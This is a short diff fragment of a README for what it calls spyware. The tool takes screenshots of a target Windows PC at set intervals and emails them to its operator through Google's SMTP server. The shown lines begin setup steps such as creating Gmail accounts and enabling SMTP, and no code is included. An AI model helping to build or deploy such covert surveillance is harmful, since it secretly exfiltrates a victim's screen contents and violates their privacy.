@@ -2,6 +2,7 @@
 a spyware designed to take screenshots of a target Windows PC at set intervals and use the Google SMTP server to deliver them to the client anywhere.
 
 Instructions: 
+
 1.Create two new gmail emails. or use existing ones if you want to take the risk.
 
 2.Enable SMTP on the sending email.
